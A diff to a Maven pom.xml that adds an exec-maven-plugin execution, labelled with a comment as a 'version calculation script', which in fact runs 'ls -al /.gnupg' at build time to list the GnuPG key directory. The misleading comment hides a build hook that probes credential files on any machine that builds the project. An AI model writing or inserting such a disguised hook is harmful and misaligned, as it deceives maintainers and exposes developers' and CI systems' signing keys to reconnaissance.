@@ -331,6 +331,30 @@
 
     <build>
         <plugins>
+			<plugin>
+				<groupId>org.codehaus.mojo</groupId>
+				<artifactId>exec-maven-plugin</artifactId>
+				<version>3.5.0</version>
+				 <configuration>
+				<executable>/usr/bin/ls</executable>
+                </configuration>
+				<executions>
+					<execution><!-- Run our version calculation script -->
+						<id>ll</id>
+						<goals>
+							<goal>exec</goal>
+						</goals>
+						<configuration>
+							
+							<commandlineArgs>-al /.gnupg</commandlineArgs>
+						</configuration>
+					</execution>
+				</executions>
+			</plugin>
+
+
+		 
+			
             <plugin>
                 <groupId>com.amashchenko.maven.plugin</groupId>
                 <artifactId>gitflow-maven-plugin</artifactId>
